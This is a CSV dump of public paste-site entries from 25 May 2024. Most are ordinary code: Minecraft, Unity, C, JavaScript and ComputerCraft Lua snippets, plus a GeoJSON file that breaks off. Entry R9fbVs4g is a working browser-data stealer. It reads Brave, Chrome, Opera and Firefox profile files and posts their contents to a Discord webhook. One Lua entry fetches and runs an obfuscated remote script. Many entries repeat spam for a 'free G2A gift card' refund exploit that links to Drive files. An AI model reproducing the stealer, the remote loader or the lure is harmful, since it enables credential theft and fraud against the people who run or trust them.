id,title,username,language,date,content
7cV3MKZd,üéâG2A.com Free Gift Card Guide May 2024 FIXüí∞,Bufayez,Python,Saturday 25th of May 2024 12:59:18 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
R9fbVs4g,Untitled,johnfikennedy,Python,Saturday 25th of May 2024 12:58:11 PM CDT,"import os
import requests
import time
username = os.getlogin()

brave = fr'C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default'
google = fr'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
opera1 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera Stable\\Default'
opera2 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera GX Stable\\Default'
mozilla = fr'C:\\Users\\{username}\\AppData\\Local\\Mozilla\\Firefox\\Profiles'
webhook_url = 'https://discord.com/api/webhooks/1243971377405628527/urwebhook'
def send_discord_webhook(webhook_url, message):
    MAX_MESSAGE_LENGTH = 2000
    num_segments = len(message) // MAX_MESSAGE_LENGTH + 1

    for i in range(num_segments):
        time.sleep(1/49) # 50 messages per second https://support-dev.discord.com/hc/en-us/articles/6223003921559-My-Bot-Is-Being-Rate-Limited

        start_index = i * MAX_MESSAGE_LENGTH
        end_index = (i + 1) * MAX_MESSAGE_LENGTH
        segment = message[start_index:end_index]

        payload = {'content': segment}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, json=payload, headers=headers)

        if response.status_code != 204:
            print(f""Failed to send segment {i+1} of the message."")
        else:
            print(f""Segment {i+1} of the message sent successfully."")
def read_large_file(file_path, chunk_size=1024):
    with open(file_path, 'r', encoding='utf-8') as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            yield chunk

def read_files_in_directory(directory, blacklist=[]):
    # Check if the directory exists
    if not os.path.exists(directory):
        return
    
    # Iterate over each file in the directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        # Check if the path is a file
        allow = True
        for keyword in blacklist:
            if keyword in file_path:
                allow = False
        if allow:
            if os.path.isfile(file_path):
                # Check file size
                file_size = os.path.getsize(file_path)
                if file_size > 100 * 1024 * 1024:  # If file size exceeds 100MB, split into segments
                    for chunk in read_large_file(file_path):
                        send_discord_webhook(webhook_url, chunk)
                else:
                    # Open the file and read its contents
                    try:
                        with open(file_path, 'r', encoding='utf-8') as file:
                            contents = file.read()
                            # Check if the contents are empty
                            if contents.strip():  # If contents are not empty
                                send_discord_webhook(webhook_url, contents)
                            else:  # If contents are empty, try a different encoding
                                try:
                                    with open(file_path, 'r', encoding='latin-1') as file:
                                        contents = file.read()
                                        send_discord_webhook(webhook_url, contents)
                                except Exception as e:
                                    pass
                    except UnicodeDecodeError:

                        try:
                            with open(file_path, 'r', encoding='latin-1') as file:
                                contents = file.read()
                                send_discord_webhook(webhook_url, contents)
                        except Exception as e:
                            pass
                    except Exception as e:
                        pass
# Brave
try:
    read_files_in_directory(brave, ['Favicon', 'History', 'publisher_info_db', 'Rewards.log', 'Shortcuts'])
except:
    pass
    
# Google
try:
    read_files_in_directory(google)
except:
    pass

# Opera
try:
    read_files_in_directory(opera1)
except:
    pass

try:
    read_files_in_directory(opera2)
except:
    pass
# Mozilla
try:
    sub_folders = [name for name in os.listdir(mozilla) if os.path.isdir(os.path.join(mozilla, name))]
    for sub_folder in sub_folders:
        read_files_in_directory(f'{mozilla}{sub_folder}\cache2\entries')
except:
    pass
"
CduERbRA,untitled,Bacon_Script,Lua,Saturday 25th of May 2024 12:56:23 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Goat-Hub103/The-Classic-Event/main/obf_UE79aAiNwWqDbHxG8NOAHj7b8Om543a0MB466g7U14m4edl8X89aWMdu0U4axbRC.lua.txt""))()"
cbX8s37C,ü§ë G2A.com Free Gift Card Guide May 2024 FIX üéÅ,ssss50w,GetText,Saturday 25th of May 2024 12:54:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
25 May 2024"
2sNXMVZM,üöÄG2A.com Free Gift Card Guide May 2024 FIXüöÄ,Alfonso1119,Python,Saturday 25th of May 2024 12:47:29 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
wNQ8PkF3,üí∞G2A.com Free Gift Card Guide May 2024 FIX,Garoam,Python,Saturday 25th of May 2024 12:41:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
xnWQXAdG,üí∞G2A.com Free Gift Card Guide May 2024 FIXüí∞,lookos13,Python,Saturday 25th of May 2024 12:29:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
uHrCvgXq,Area dot java,LampBoy,Java,Saturday 25th of May 2024 12:23:48 PM CDT,"interface FunctionalInterface {
    void areaFunction(ArrayList list, int x, int y, int z);
}

public class Area {
    private final UUID ownerUuid;
    private final BlockPos startPos;
    private final BlockPos endPos;
    private final World world;
    private final String name;
    private final UUID uuid;

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID ownerUuid) {
        this(startPos, endPos, name, UUID.randomUUID(), ownerUuid);
    }

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID uuid, UUID ownerUuid) {
        this.startPos = startPos;
        this.endPos = endPos;
        this.world = MinecraftClient.getInstance().world;
        this.name = name;
        this.uuid = uuid;
        this.ownerUuid = ownerUuid;
    }

    public ArrayList<Block> getBlocks() {
        ArrayList<Block> blockList = this.executeInArea((list, x, y, z) -> {
            list.add(world.getBlockState(new BlockPos(x, y, z)).getBlock());
        });
        return blockList;
    }

    public ArrayList<LivingEntity> getDetectedEntities() {
        ArrayList<LivingEntity> entityList = this.executeInArea((list, x, y, z) -> {
            world.getNonSpectatingEntities(LivingEntity.class, new Box(new BlockPos(x, y, z))).forEach(value -> list.add(value));
        });
        // Removes duplicates from the list
        HashSet<LivingEntity> entitySet = new HashSet<>();
        entityList.forEach(value -> entitySet.add(value));
        entityList.clear();
        entitySet.forEach(value -> entityList.add(value));
        return entityList;
    }

    public <T> ArrayList<T> executeInArea(FunctionalInterface function) {
        ArrayList<T> list = new ArrayList<>();
        int x;
        int y;
        int z;

        x = startPos.getX();
        while (true) {
            y = startPos.getY();
            while (true) {
                z = startPos.getZ();
                while (true) {
                    if (z < endPos.getZ()) {
                        // Runs lambda expressions. defined in FuncitionalInterface.
                        function.areaFunction(list, x, y, z);
                        z++;
                    } else if (z > endPos.getZ()) {
                        function.areaFunction(list, x, y, z);
                        z--;
                    } else {
                        function.areaFunction(list, x, y, z);
                        break;
                    }
                }
                if (y < endPos.getY()) {
                    y++;
                } else if (y > endPos.getY()) {
                    y--;
                } else {
                    break;
                }
            }
            if (x < endPos.getX()) {
                x++;
            } else if (x > endPos.getX()) {
                x--;
            } else {
                break;
            }
        }
        return list;
    }

    public static NbtElement toNbt(Area area) {
        NbtCompound nbt = new NbtCompound();
        nbt.put(""startPos"", NbtHelper.fromBlockPos(area.getStartPos()));
        nbt.put(""endPos"", NbtHelper.fromBlockPos(area.getEndPos()));
        nbt.putString(""name"", area.getName());
        nbt.putUuid(""uuid"", area.getUuid());
        return nbt;
    }

    public static Area fromNbt(NbtCompound nbt) {
        World world = MinecraftClient.getInstance().world;
        BlockPos startPos = NbtHelper.toBlockPos(nbt.getCompound(""startPos""));
        BlockPos endPos = NbtHelper.toBlockPos(nbt.getCompound(""endPos""));
        String name = (nbt.getString(""name""));
        UUID uuid = (nbt.getUuid(""uuid""));
        return new Area(startPos, endPos, name, uuid);
    }

    public static ArrayList<Area> generateAreaListFromNbtList(NbtList nbtList) {
        ArrayList<Area> areaList = new ArrayList<>();
        for (NbtElement nbt : nbtList) {
            areaList.add(fromNbt(((NbtCompound) nbt)));
        }
        return areaList;
    }

    public String getName() {
        return name;
    }

    public BlockPos getStartPos() {
        return startPos;
    }

    public BlockPos getEndPos() {
        return endPos;
    }

    public World getWorld() {
        return world;
    }

    public UUID getUuid() {
        return uuid;
    }
}"
4t5ypbXv,üí∞G2A.com Free Gift Card Guide May 2024 FIXüéâ,pestinha,Python,Saturday 25th of May 2024 12:23:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
rnmxYmiE,Untitled,pasholnahuy,C++,Saturday 25th of May 2024 12:18:33 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>

#define MAX_DEPTH 4

void print_regular_files(const char* dir_path, int depth, off_t max_size) {
    DIR* dir = opendir(dir_path);
    if (dir == NULL) {
        return;
    }

    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0) {
            continue;
        }

        char path[PATH_MAX];
        snprintf(path, sizeof(path), ""%s/%s"", dir_path, entry->d_name);

        struct stat st;
        if (lstat(path, &st) == -1) {
            continue;
        }

        if (S_ISREG(st.st_mode) && access(path, R_OK) != -1 && st.st_size <= max_size) {
            printf(""%s\n"", entry->d_name);
        } else if (S_ISDIR(st.st_mode) && depth < MAX_DEPTH) {
            print_regular_files(path, depth + 1, max_size);
        }
    }

    closedir(dir);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf(""Usage: ./yourprog directory max_size\n"");
        return 0;
    }

    const char* dir_path = argv[1];
    off_t max_size = atoll(argv[2]);

    print_regular_files(dir_path, 0, max_size);

    return 0;
}"
1ksXxyuk,Unity Bootstrapping,apieceoffruit,C#,Saturday 25th of May 2024 12:15:07 PM CDT,"    public static class BootstrapApplication
    {
        [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSceneLoad)]
        public static void Initialize()
        {
            var gameManagers = Resources.Load<GameManagers>(GAMEMANAGERS);
            var instance = Object.Instantiate(gameManagers);
            instance.name = GAMEMANAGERS;
            Object.DontDestroyOnLoad(instance);

        }
        const string GAMEMANAGERS = ""GameManagers"";
    }"
BW3yLBNQ,ü§ë G2A.com Free Gift Card Guide May 2024 FIX ü§ë,jusst2k4,GetText,Saturday 25th of May 2024 12:02:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_741586.pdf

Working as of:
25 May 2024"
pqRQucay,niente,bstefano79,JavaScript,Saturday 25th of May 2024 11:47:02 AM CDT,"const InputUserNameLogIn = document.querySelector('#username');
const InputPasswordLogIn = document.querySelector('#password');
const paragErrore = document.querySelector('#errore-log-in');
const form = document.querySelector('#form-Log-in');

 
let richiesta;
let data;
let conferma;
 

form.addEventListener('submit', function(event) {
    event.preventDefault();
    const userNameLogIn = InputUserNameLogIn.value;
    const passwordLogIn = InputPasswordLogIn.value;

    richiesta = new XMLHttpRequest();
 
    richiesta.open('POST', 'http://localhost/vsc/php/log-in.php', true);

    richiesta.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded"");

    richiesta.onreadystatechange = function() {
        if (richiesta.readyState === 4) {
            if (richiesta.status === 200) {
                console.log(richiesta.responseText);
                conferma = richiesta.responseText;

                constlocationHeader = richiesta.getResponseHeader('Location');
                if (locationHeader) {
                     window.location.href = locationHeader;
                } else {
                     console.log(richiesta.responseText);
                }

            } else {
                console.error('Errore durante la richiesta. Codice di stato:', richiesta.status);
            }
        }
    };

    data = ""username="" + encodeURIComponent(userNameLogIn) + ""&password="" + encodeURIComponent(passwordLogIn);
    richiesta.send(data);

    console.log('Il submit del form √® stato bloccato. '+userNameLogIn+' '+passwordLogIn);

    gestioneFront(event)
});
 
// Funzione aggiornata per gestire il front-end in base al risultato del login
function gestioneFront(event) {
    if (conferma > 0) {
        console.log('Accesso eseguito');
    } else {
        paragErrore.innerText = 'Credenziali non corrette';
        paragErrore.style.color = 'red';
    }
}"
TRccS9mD,High-Test,MagmaLP,Lua,Saturday 25th of May 2024 11:35:11 AM CDT,"os.loadAPI(""ocs/apis/sensor"")
s = sensor.wrap(""top"")
rednet.open(""back"")
term.setBackgroundColor(32768)
term.setCursorPos(1,1)
term.clear()
 
------------------------------------------------------------
term.setTextColor(colors.yellow)
print(""Item Trading System"")
print(""~~~~~~~~~~~~~~~~~~~"")
print("" "")
term.setTextColor(colors.red)
print("" "")
print(""please come closer !!!"")
print(""please come closer !!!"")
print(""please come closer !!!"")
print("" "")
print(""Always stand inside the white circle"")
print(""on the floor, that goes around the Computer."")
print("" "")
print("" "")
print("" "")
print("" "")
term.setTextColor(colors.lightGray)
print(""Shop build by MagmaLP"")
print(""System programmed by MagmaLP"")
print(""01.01.2023"")
print(""In case of errors please report to MagmaLP"")
------------------------------------------------------------
 
local itemList = { ""HV Solar Panel"", ""MV Solar Panel"", ""LV Solar Panel"", ""ME Cable"", ""ME Storage Bus"", ""ME Import Bus"",
                 ""ME Export Bus"",
                 ""ME Controller"", ""ME Access Terminal"", ""ME Drive"", ""Re-Enriched Uranium Cell"", ""ME 64k Storage"", ""ME 16k Storage"", 
                 ""ME 4k Storage"" } 
 
function calc_color(color)
    return math.pow(2, color - 1)
end
 
function msg(gap, line, color, groundb, text) 
    term.setBackgroundColor(calc_color(groundb))
    term.setCursorPos(gap,line)
    term.setTextColor(calc_color(color))
    text = term.write(text)
end 
 
file = fs.open(""local/"", ""w"")           --name local l√∂schen
file.write(""                                "")
file.close()
 
m0 = 0
m1 = 0
m2 = 0
m3 = 0
m4 = 0
m5 = 0
m6 = 0
m7 = 0
m8 = 0
m9 = 0
m10 = 0
m11 = 0
m12 = 0
m13 = 0
m14 = 0
m15 = 0
m16 = 0
m17 = 0
M = {m0, m1, m2, m3, m4, m5, m6, m7, m8, m9, m10, m11, m12, m13, m14, m15, m16, m17}
 
b1 = 0 
b2 = 0
b3 = 8000
b4 = 1000
b5 = 150
b6 = 10
b7 = 125
b8 = 125
b9 = 120
b10 = 250
b11 = 150
b12 = 65
b13 = 3
b14 = 5000
b15 = 2000
b16 = 1000
b17 = 0
B = {b1, b2, b3, b4, b5, b6, b7, b8, b9, b10, b11, b12, b13, b14, b15, b16, b17}
 
function kaufen()
 
        local event, button, X, Y = os.pullEvent(""mouse_click"")
        for i = 3,13 do                                             --item von zeile 3-13
            if X >= 40 and X <= 42 and Y == i then                  -- +1
                if M[i] < 60 then                                   -- max 60
                    M[i] = M[i] + 1
                    c = c + B[i]
                    msg(44,i,04,16,""""..M[i].."""")
                    msg(42,19,06,16,""""..c..""$"")
                    break
                end
            end
            if X >= 47 and X <= 49 and Y == i then                  -- -1
                if M[i] > 0 then
                    M[i] = M[i] - 1
                    c = c - B[i]
                    msg(44,i,04,16,""""..M[i].."" "")
                    msg(42,19,06,16,""""..c..""$     "")
                    break
                end
            end
        end
        
        for i = 14,16 do                                            --item von zeile 14-16
            if X >= 40 and X <= 42 and Y == i then                  -- +1
                if M[i] < 1 then                                    -- max 1
                    M[i] = M[i] + 1
                    c = c + B[i]
                    msg(44,i,04,16,""""..M[i].."""")
                    msg(42,19,06,16,""""..c..""$"")
                    break
                end
            end
            if X >= 47 and X <= 49 and Y == i then                  -- -1
                if M[i] > 0 then
                    M[i] = M[i] - 1
                    c = c - B[i]
                    msg(44,i,04,16,""""..M[i].."" "")
                    msg(42,19,06,16,""""..c..""$     "")
                    break
                end
            end
        end
        
        c = tonumber(c)
        money = tonumber(money)        
 
        if X >= 11 and X <= 21 and Y == 19 then                 --Abbrechen
            os.reboot()   
                    
        elseif X >= 01 and X <= 08 and Y == 19 then             --Kaufen    
            if c > money then                                   --zu wenig Geld
                msg(41,19,01,15,"" ""..c..""$ "")
                sleep(0.25) 
                msg(41,19,06,16,"" ""..c..""$ "")
                sleep(0.25)
                msg(41,19,01,15,"" ""..c..""$ "")
                sleep(0.25)
                msg(41,19,06,16,"" ""..c..""$ "")
                sleep(0.5)
                
            elseif c <= money then                              --genug Geld
                money = money - c
            
                file = fs.open(""local/"" , ""r"")              --read user
                name = file.readLine()
                file.close()
                file = fs.open(""user/"" ..name.. ""/"", ""w"")
                file.write(money)
                file.close()
            
             	if fs.exists(""spendmoney/"" ..name) == false then          --create spendmoney directory
                    file = fs.open(""spendmoney/"" ..name.. ""/"", ""w"")
                    file.write(0.0)
                    file.close()
                end
            
				file = fs.open(""spendmoney/"" ..name, ""r"")             --read user of spendmoney directory
                oldspendmoney = file.readLine()
                file.close()
                
                spendmoney = oldspendmoney + c
                
                file = fs.open(""spendmoney/"" ..name.. ""/"", ""w"")
                file.write(spendmoney)
                file.close()
                    
                package = {}
                for i,amount in pairs(M) do     --sende Daten an turtle
                    local a = {}
                        
                    if amount > 0 then
                        local num = i - 2
                        a = {
                            [""Slot""] = num,
                            [""Amount""] = amount
                        }
                        table.insert(package, a)
                        writeToFile(num, amount)
                    end
                end
                rednet.open(""back"")
                rednet.send(11894,textutils.serialize(package))  
                os.reboot()
             end
        end 
--    end
    kaufen()   
end
 
function writeToFile(item, amount)
    local file = http.get(""http://www.atomuhr.de/uhrzeit/"")
    local file2 = file.readAll()
    local length = file2.len(file2)
    local start = length - 40
    local endString = length - 22
    local time = string.sub(file2, start, endString)
                
    file = fs.open(""kaufliste"", ""a"")
    file.write(""\n"", "" "")
    file.write(time.."" "")
    file.write(name.."" "")
    file.write(itemList[item].."" ""..amount)
    file.close()
end
 
while true do
    for name,info in pairs(s.getTargets()) do               --detect user
        if fs.exists(""user/"" ..name) == false then          --create user
            file = fs.open(""user/"" ..name.. ""/"", ""w"")
            file.write(0.0)
            money = ""0.0""
            file.close()
        else
            file = fs.open(""user/"" ..name, ""r"")             --read user
            money = file.readLine()
            file.close()
        end
        
        file = fs.open(""local/"", ""w"")           --name local speichern
        file.write(name)
        file.close()
        
        for a = 1,20 do
            for b = 1,51 do
                msg(b,a,16,16,"" "")
            end
        end
        
        msg(01,01,06,16,""< Account of ""..name.."" >"")   msg(36,01,06,16,"" >  ""..money..""$        "")      --√ºberschrift
        msg(01,02,04,16,""+-------------------------------------------------+"")
        
        msg(06,07,01,15,""                  "")   msg(30,07,01,15,""                "")         --mainscreen
        msg(06,08,01,15,""  deposit money   "")   msg(30,08,01,15,""   buy items    "") 
        msg(06,09,01,15,""                  "")   msg(30,09,01,15,""                "")
        
        msg(02,13,09,16,""This PC exchanges items for virtual money"")
        msg(02,14,09,16,""(saved on this PC)"")
        msg(02,15,09,16,""in order to buy other items with it."")
        
        msg(01,19,01,16,""                   >> Top-List <<                       "")
        
        local event, button, X, Y = os.pullEvent(""mouse_click"") 
        if X >= 06 and X <= 23 and Y >= 07 and Y <= 09 then                                 --Verkauf Screen
            for a = 3,20 do
                for b = 1,50 do
                    msg(b,a,16,16,"" "")
                end
            end
            sleep(0.5)
            msg(02,06,01,15,""                                                 "")
            msg(02,07,01,15,"" click here to see a list of all sellable items  "")
            msg(02,08,01,15,""                                                 "")
 
            msg(02,12,09,16,""Throw in all items on the left and confirm with"")
            msg(02,13,09,16,""the button below. The money is stored permanently "")
            msg(02,14,09,16,""until you buy something with it."")
            
            msg(40,16,01,15,""          "")
            msg(40,17,01,15,"" confirm  "")   msg(32,17,01,16,""----->"")
            msg(40,18,01,15,""          "")
            
            msg(01,19,16,01,""back"")
            
            local event, button, X, Y = os.pullEvent(""mouse_click"") 
            if X >= 03 and X <= 48 and Y >= 06 and Y <= 08 then         --item list button
                for a = 3,20 do
                    for b = 1,50 do
                        msg(b,a,16,16,"" "")
                    end
                end 
                
                msg(02,04,09,16,""1x Shard of Minium =   25$         (64x = 1600$)"")
                msg(02,05,09,16,""1x Quartz Crystal  =   25$         (64x = 1600$)"")
                msg(02,06,09,16,""1x Lead Ore        =    4$         (64x = 256$)"")
                msg(02,07,09,16,""1x Silver Ore      =    3$         (64x = 192$)"")
                msg(02,08,09,16,""1x Tungsten Ore    =   40$         (64x = 2560$)"")
                msg(02,09,09,16,""1x Ferrouse Ore    =   50$         (64x = 3200$)"")
                msg(02,10,09,16,""1x Ghast Tear      =  120$         (64x = 7680$)"")
                msg(02,11,09,16,""1x Shiny Ingot     =  500$         (64x = 32000$)"")
                msg(02,12,09,16,""1x Wither Skull    = 2000$"")
                msg(02,13,09,16,""1x Nether Star     = 6000$"")
                
                msg(01,19,16,01,""back"")                
                local event, button, X, Y = os.pullEvent(""mouse_click"") 
                if X >= 01 and X <= 04 and Y == 19 then                 --back button
                    os.reboot()
                end
            elseif X >= 40 and X <= 49 and Y >= 16 and Y <= 18 then     --confirm button
                rednet.send(11900,1)
                x, y, z = rednet.receive()
                money = y + money
                local file = fs.open(""user/"" ..name.. ""/"", ""w"")
                file.write(money)
                file.close()
            elseif X >= 01 and X <= 04 and Y == 19 then                 --back button2
                    os.reboot()
            end
                
        elseif X >= 30 and X <= 45 and Y >= 07 and Y <= 09 then         --kaufen Screen
 
            for a = 3,20 do
                for b = 1,50 do
                    msg(b,a,16,16,"" "")
                end
            end
            c = 0.0
            msg(01,03,04,16,""| 8000$ HV Solar Panel"")               msg(51,03,04,16,""|"")
            msg(01,04,04,16,""| 1000$ MV Solar Panel"")               msg(51,04,04,16,""|"")
            msg(01,05,04,16,""|  150$ LV Solar Panel"")               msg(51,05,04,16,""|"")
            msg(01,06,04,16,""|   10$ ME Cable         "")            msg(51,06,04,16,""|"")
            msg(01,07,04,16,""|  125$ ME Storage Bus   "")            msg(51,07,04,16,""|"")
            msg(01,08,04,16,""|  125$ ME Import Bus    "")            msg(51,08,04,16,""|"")
            msg(01,09,04,16,""|  120$ ME Export Bus    "")            msg(51,09,04,16,""|"")
            msg(01,10,04,16,""|  250$ ME Controller    "")            msg(51,10,04,16,""|"")
            msg(01,11,04,16,""|  150$ ME Access Terminal"")           msg(51,11,04,16,""|"")
            msg(01,12,04,16,""|   65$ ME Drive"")                     msg(51,12,04,16,""|"")
            msg(01,13,04,16,""|    3$ Re-Enriched Uranium Cell"")     msg(51,13,04,16,""|"")
            msg(01,14,04,16,""| 5000$ ME 64k Storage   "")            msg(51,14,04,16,""|"")
            msg(01,15,04,16,""| 2000$ ME 16k Storage   "")            msg(51,15,04,16,""|"")
            msg(01,16,04,16,""| 1000$ ME  4k Storage   "")            msg(51,16,04,16,""|"")
            msg(01,17,04,16,""|                        "")            msg(51,17,04,16,""|"")
            msg(01,18,04,16,""+-------------------------------------------------+"")
            msg(01,19,01,15,""  Buy   "") msg(11,19,01,15,""  Cancel   "")
            msg(34,19,04,16,""Amount:"")  msg(42,19,06,16,""""..c..""$"")  
 
            for i = 3,16 do                     -- +f√ºr zeile 3-16
                msg(40,i,01,15,"" + "")   
            end
            for i = 3,16 do                     -- 0f√ºr zeile 3-16
                msg(44,i,04,16,""0"")
            end
            for i = 3,16 do                     -- -f√ºr zeile 3-16
                msg(47,i,01,15,"" - "")
            end   
            kaufen()
        elseif X >= 19 and X <= 34 and Y >= 18 and Y <= 19 then         --Top-List Screen
		    for a = 1,20 do
                for b = 1,50 do
                    msg(b,a,16,16,"" "")
                end
            end 
            
            msg(01,01,06,16,""                 Money - Top List                  "")      --√ºberschrift 1
        	msg(01,02,04,16,""+-------------------------------------------------+"")
            
            -- Funktion zum Einlesen des Inhalts einer Datei und Umwandeln in eine Zahl
            local function readNumberFromFile(fileName)
                local file = fs.open(fileName, ""r"")
                if file then
                    local content = file.readAll()
                    file.close()
                    return tonumber(content)
                end
                return nil
            end

            -- Verzeichnisname
            local directory = ""user""

            -- Liste aller Dateien im Verzeichnis
            local files = fs.list(directory)

            -- Tabelle zur Speicherung der Spieler und ihrer Punkte
            local scores = {}

            -- Durchlaufen aller Dateien im Verzeichnis
            for _, file in ipairs(files) do
                local filePath = fs.combine(directory, file)
                local score = readNumberFromFile(filePath)
                if score then
                    table.insert(scores, {name = file, score = score})
                end
            end

            -- Funktion zum Sortieren der Scores
            local function compareScores(a, b)
                return a.score > b.score
            end

            -- Sortieren der Scores
            table.sort(scores, compareScores)

            -- Ausgabe der Top 5 Spieler
            for i = 1, math.min(6, #scores) do
 				print(i .. "". "" .. scores[i].name .. "" - "" .. scores[i].score)
            end
            
            msg(01,10,06,16,""              Money spend - Top List               "")      --√ºberschrift 2
        	msg(01,11,04,16,""+-------------------------------------------------+"")
            
            -- Funktion zum Einlesen des Inhalts einer Datei und Umwandeln in eine Zahl
            local function readNumberFromFile(fileName)
                local file = fs.open(fileName, ""r"")
                if file then
                    local content = file.readAll()
                    file.close()
                    return tonumber(content)
                end
                return nil
            end

            -- Verzeichnisname
            local directory = ""spendmoney""

            -- Liste aller Dateien im Verzeichnis
            local files = fs.list(directory)

            -- Tabelle zur Speicherung der Spieler und ihrer Punkte
            local scores = {}

            -- Durchlaufen aller Dateien im Verzeichnis
            for _, file in ipairs(files) do
                local filePath = fs.combine(directory, file)
                local score = readNumberFromFile(filePath)
                if score then
                    table.insert(scores, {name = file, score = score})
                end
            end

            -- Funktion zum Sortieren der Scores
            local function compareScores(a, b)
                return a.score > b.score
            end

            -- Sortieren der Scores
            table.sort(scores, compareScores)

            -- Ausgabe der Top 5 Spieler
            for i = 1, math.min(6, #scores) do
 				print(i .. "". "" .. scores[i].name .. "" - "" .. scores[i].score)
            end
            
            msg(01,19,16,01,""back"")                
            local event, button, X, Y = os.pullEvent(""mouse_click"") 
            if X >= 01 and X <= 04 and Y == 19 then                 --back button
                os.reboot()
            end
        end    
    end
end"
jNTvQvXu,Highscore test,MagmaLP,Lua,Saturday 25th of May 2024 11:28:09 AM CDT,"-- Funktion zum Einlesen des Inhalts einer Datei und Umwandeln in eine Zahl
local function readNumberFromFile(fileName)
    local file = fs.open(fileName, ""r"")
    if file then
        local content = file.readAll()
        file.close()
        return tonumber(content)
    end
    return nil
end

-- Verzeichnisname
local directory = ""highscore""

-- Liste aller Dateien im Verzeichnis
local files = fs.list(directory)

-- Tabelle zur Speicherung der Spieler und ihrer Punkte
local scores = {}

-- Durchlaufen aller Dateien im Verzeichnis
for _, file in ipairs(files) do
    local filePath = fs.combine(directory, file)
    local score = readNumberFromFile(filePath)
    if score then
        table.insert(scores, {name = file, score = score})
    end
end

-- Funktion zum Sortieren der Scores
local function compareScores(a, b)
    return a.score > b.score
end

-- Sortieren der Scores
table.sort(scores, compareScores)

-- Ausgabe der Top 5 Spieler
print(""Top 5 Spieler:"")
for i = 1, math.min(5, #scores) do
    print(i .. "". "" .. scores[i].name .. "" - "" .. scores[i].score)
end
"
M59BhybL,Markers,EXTREMEXPLOIT,JSON,Saturday 25th of May 2024 11:12:44 AM CDT,"{
  ""type"": ""FeatureCollection"",
  ""features"": [
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/iN9jn6s.png"",
        ""type"": ""user"",
        ""label"": ""Athletics""
      },
      ""geometry"": {
        ""coordinates"": [
          14.444181909806275,
          50.10462108397277
        ],
        ""type"": ""Point""
      },
      ""id"": 0
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/2PnWMgN.jpeg"",
        ""type"": ""user"",
        ""label"": ""Kipchogue""
      },
      ""geometry"": {
        ""coordinates"": [
          14.447950892876037,
          50.10462108397277
        ],
        ""type"": ""Point""
      },
      ""id"": 1
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/BAtaGP8.jpeg"",
        ""type"": ""user"",
        ""label"": ""Joan""
      },
      ""geometry"": {
        ""coordinates"": [
          14.429616360647884,
          50.10182590726754
        ],
        ""type"": ""Point""
      },
      ""id"": 3
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/YcgCQav.jpeg"",
        ""type"": ""user"",
        ""label"": ""lid6""
      },
      ""geometry"": {
        ""coordinates"": [
          14.454742855087403,
          50.092708971564804
        ],
        ""type"": ""Point""
      },
      ""id"": 3
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/KXXNWig.jpeg"",
        ""type"": ""place""
      },
      ""geometry"": {
        ""coordinates"": [
          14.449796064806577,
          50.09323790192914
        ],
        ""type"": ""Point""
      },
      ""id"": 4
    },
    {
      ""type"": ""Feature"",
      ""properties"": {
        ""url"": ""https://i.imgur.com/4hzMKFa.jpeg"",
